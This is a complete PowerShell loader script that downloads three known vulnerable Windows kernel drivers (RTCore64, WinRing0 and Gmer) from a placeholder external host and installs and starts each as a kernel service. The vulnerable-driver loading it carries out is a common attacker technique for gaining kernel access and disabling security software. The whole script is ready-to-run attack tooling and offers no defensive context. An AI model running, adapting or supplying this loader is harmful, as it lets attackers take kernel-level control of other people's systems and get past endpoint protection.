# LOLDDriver Triple Loader PowerShell Script
# Purpose: Drop, install, and run RTCore64.sys, WinRing0.sys, and Gmer.sys

$Drivers = @(
    @{ Name = "RTCore64"; Url = "https://example.com/drop/RTCore64.sys" },
    @{ Name = "WinRing0"; Url = "https://example.com/drop/WinRing0.sys" },
    @{ Name = "Gmer"; Url = "https://example.com/drop/gmer64.sys" }
)

foreach ($driver in $Drivers) {
    $DriverName = $driver.Name
    $DriverPath = "$env:ProgramData\$DriverName.sys"
    $RemoteDriverURL = $driver.Url

    Write-Host "[+] Downloading $DriverName.sys..."
    try {
        Invoke-WebRequest -Uri $RemoteDriverURL -OutFile $DriverPath -UseBasicParsing
        Write-Host "[+] Saved to $DriverPath"
    } catch {
        Write-Host "[-] Failed to download $DriverName from $RemoteDriverURL"
        continue
    }

    Write-Host "[+] Creating $DriverName service..."
    sc.exe create $DriverName binPath= $DriverPath type= kernel start= demand | Out-Null

    Write-Host "[+] Starting $DriverName driver..."
    sc.exe start $DriverName | Out-Null

    Start-Sleep -Seconds 1
    $status = sc.exe query $DriverName
    if ($status -like "*RUNNING*") {
        Write-Host "[+] $DriverName loaded successfully."
    } else {
        Write-Host "[-] $DriverName failed to load."
    }
    Write-Host "-----------------------------"
}

Write-Host "[!] All drivers processed. Check load status with 'driverquery' or 'fltmc'."
